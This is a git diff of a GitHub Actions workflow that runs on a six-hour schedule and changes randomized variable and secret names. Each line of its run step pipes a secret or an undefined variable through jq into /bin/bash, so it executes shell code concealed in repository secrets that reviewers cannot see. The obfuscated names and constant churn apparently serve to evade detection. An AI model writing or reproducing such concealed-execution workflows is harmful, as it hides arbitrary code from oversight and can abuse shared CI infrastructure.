@@ -1,25 +1,25 @@
 name: curiouslively
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 5/6 * * *'
+    - cron: '5 0/6 * * *'
 
-jobs:  # 29929
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: curiouslively
         env:
-          pxyy266: ${{ secrets.pxyy266 }}
+          kr774: ${{ secrets.kr774 }}
         run: |
-          echo $pxyy266 | jq -r .jgue7 | /bin/bash
-          echo $o213 | jq -r .mz91 | /bin/bash
-          echo $btgz3 | jq -r .q28 | /bin/bash
-          echo $ddvj3903 | jq -r .kacy161 | /bin/bash
-          echo $b24553 | jq -r .bzo694 | /bin/bash
-          echo $nncn15 | jq -r .dtktz2920 | /bin/bash
-          echo $nwsp50687 | jq -r .btnoa2758 | /bin/bash
-          echo $cnmvl69210 | jq -r .xhlve33219 | /bin/bash
+          echo $kr774 | jq -r .sit98068 | /bin/bash
+          echo $xb8853 | jq -r .qopq62435 | /bin/bash
+          echo $c8 | jq -r .c11736 | /bin/bash
+          echo $ob6 | jq -r .epkt555 | /bin/bash
+          echo $g8 | jq -r .wm854 | /bin/bash
+          echo $ziyfg83787 | jq -r .q0 | /bin/bash
+          echo $hura1 | jq -r .ozvgc397 | /bin/bash
+          echo $ihq74 | jq -r .x0 | /bin/bash
+          echo $r29 | jq -r .kj8 | /bin/bash
 
